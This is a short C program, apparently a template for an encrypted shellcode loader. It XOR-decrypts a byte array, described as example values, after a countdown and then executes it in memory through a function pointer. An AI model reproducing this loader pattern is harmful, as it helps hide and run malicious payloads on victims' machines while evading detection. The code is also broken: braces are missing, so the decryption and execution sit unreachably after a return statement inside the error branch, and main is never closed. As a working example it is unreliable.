#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Encrypted shellcode and key (currently only example values)
unsigned char key[] = {0x2f, 0x97, 0x55, 0x3a, 0x68, 0xde, 0xfa, 0xcd, 0x22, 0x45, 0x5b, 0xa9, 0xc7, 0x35, 0x8a, 0x66, 0xe1, 0x93, 0x2d, 0x51, 0x7f, 0x47};
unsigned char encrypted_shellcode[] = {0x1e, 0x57, 0x05, 0x2a, 0x0f, 0xd1, 0x89, 0xa5, 0x0a, 0x2d, 0x39, 0xd3, 0xae, 0x11, 0xe3, 0xe4, 0xb1, 0xa1, 0x44, 0x32, 0x36, 0xcf};

// Function to decrypt shellcode
void decrypt_shellcode(unsigned char* shellcode, unsigned char* key, int len) {
    for (int i = 0; i < len; i++) {
        shellcode[i] ^= key[i];
    }
}

int main() {
    int shellcode_len = sizeof(encrypted_shellcode);

      // checks if key length is the same as length of shellcode
    if (shellcode_len != sizeof(key)) {
        printf("Error: Key length does not match shellcode length.\n");
        return 1;
    printf("Preparing to execute shellcode...\n");
    for (int i = 5; i > 0; i--) {
        printf("Starting in %d seconds...\n", i);
        sleep(1);
        
    // Decrypt shellcode
    decrypt_shellcode(encrypted_shellcode, key, shellcode_len);

    // Run the shellcode
    int (*ret)() = (int(*)())encrypted_shellcode;
    ret();
    
    return 0;